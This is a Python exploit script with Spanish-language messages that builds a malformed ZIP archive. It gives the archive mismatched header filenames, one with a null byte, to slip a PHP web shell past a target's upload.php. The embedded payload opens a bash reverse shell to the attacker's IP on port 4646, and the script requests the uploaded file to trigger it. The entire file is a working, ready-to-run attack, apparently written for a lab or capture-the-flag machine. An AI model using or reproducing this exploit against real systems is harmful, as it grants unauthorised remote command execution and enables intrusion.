import time, pdb, signal, sys
import requests
import zlib
from struct import pack

#Author Miguel3023 ( ͡❛ ᴗ ͡❛)

green_color = "\033[92m"  
red_color = "\033[91m"    
blue_color = "\033[94m"   
yellow_color = "\033[93m" 
purple_color = "\033[95m" 
cyan_color = "\033[96m"   
gray_color = "\033[90m"   
reset_color = "\033[0m"


def exiting(sig, frame):

    print(f"\n{red_color}[!]Saliendo...{reset_color}\n")
    sys.exit(1)

signal.signal(signal.SIGINT, exiting)


def local_file_headers(crc32,length,file1,contentfile):

    l = b''
    l += b'\x50\x4b\x03\x04' #Signature
    l += b'\x14\x00' #Version
    l += b'\x00\x00' #Flags
    l += b'\x00\x00' #Compression Method 
    l += b'\x1c\x7d' #File modification time  
    l += b'\x4b\x35' #File modification date 
    l += pack('<L', crc32) #Crc-32 checksum	
    l += pack('<L', length) #Compressed size	
    l += pack('<L', length) #Uncompressed size	
    l += pack('<H', len(file1)) #File name length	
    l += b'\x00\x00' #Extra field length
    l += file1 #File name	
    l += contentfile #Extra field	
    
    return l
    
def central_directory(file2, crc32, length):

    cd = b''
    cd += b'\x50\x4b\x01\x02' #Signature
    cd += b'\x14\x03' #Version
    cd += b'\x14\x00' #Version Need
    cd += b'\x00\x00' #Flags
    cd += b'\x00\x00' #Compression method	
    cd += b'\x1c\x7d' #File modification time 
    cd += b'\x4b\x35' #File modification date 
    cd += pack('<L', crc32) #Crc-32 checksum
    cd += pack('<L', length) #Compressed size
    cd += pack('<L', length) #Uncompressed size
    cd += pack('<H', len(file2)) #File name length
    cd += b'\x00\x00' #Extra field length
    cd += b'\x00\x00' #File Comment length
    cd += b'\x00\x00' #Disk start
    cd += b'\x00\x00' #Internal file attribute
    cd += b'\x00\x00\xa4\x81' # External file attribute
    cd += b'\x00\x00\x00\x00' # Offset of local header	
    cd += file2
    
    return cd

def end_central_directory(l, cd):

    end = b''
    end += b'\x50\x4b\x05\x06' #Signature
    end += b'\x00\x00' #Disk Number
    end += b'\x00\x00' #Disk # w/cd	
    end += b'\x01\x00' #Disk entries
    end += b'\x01\x00' #Total entries
    end += pack('<L', len(cd)) #Central directory size
    end += pack('<L', len(l)) #Local File Headers len
    end += b'\x00\x00'
    return end

def makeRequests(l, cd, end, target):
    
    f = open("shell.zip", "wb")
    f.write(l+cd+end)
    f.close()
    
    main_url = f'http://{target}/upload.php'
    headers = {"Content-Type":"multipart/form-data"}
    files = {'submit':(None,''),'zipFile':('shell.zip',l+cd+end)}
    response = requests.post(main_url, files=files)
    
    for output in response.text.split('\n'):
        
        if 'uploads' in output:
            
            requests.get("http://{}/{}".format(target,output.split('"')[1].split(" ")[0]))
            
            exit(0) 

if __name__=='__main__':
    
    #Variables Globales
    your_ip = input(f"\n{purple_color}[+] YOUR IP: {reset_color}")
    your_ip = your_ip.encode()
    target = input(f"\n{purple_color}[+] IP TARGET: {reset_color}")
    
    #Files in the .zip
    file1 = b'shell.php.pdf'
    file2 = b'shell.php\x00.pdf'
    
    contentfile = b"""<?php system("bash -c 'bash -i >& /dev/tcp/%s/4646 0>&1'"); ?>"""%(your_ip)
    crc32 = zlib.crc32(contentfile)
    length = len(contentfile)
    l = local_file_headers(crc32,length,file1,contentfile)
    cd = central_directory(file2,crc32,length)

    end = end_central_directory(l, cd)

    makeRequests(l,cd,end,target)
